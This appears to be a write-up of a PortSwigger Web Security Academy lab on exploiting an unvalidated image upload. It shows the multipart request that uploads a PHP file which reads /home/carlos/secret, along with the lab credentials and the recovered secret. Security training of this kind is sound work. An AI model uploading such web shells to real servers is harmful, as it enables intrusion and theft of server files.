
# Remote code execution via web shell upload

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter


---------------------------------------------

References: 

- https://portswigger.net/web-security/file-upload



![img](images/Remote%20code%20execution%20via%20web%20shell%20upload/1.png)

---------------------------------------------

There is a function to upload a logo, it is possible to upload a PHP file to show the content of the file:

```
POST /my-account/avatar HTTP/2
...
-----------------------------372082654728426116931381616293
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------372082654728426116931381616293
...
```



![img](images/Remote%20code%20execution%20via%20web%20shell%20upload/2.png)


Now you can read the value of the file ("G5Bm58gT0NzAmOPLxpe0vR82y4CNT6WY") accessing /avatars/test.php:



![img](images/Remote%20code%20execution%20via%20web%20shell%20upload/3.png)
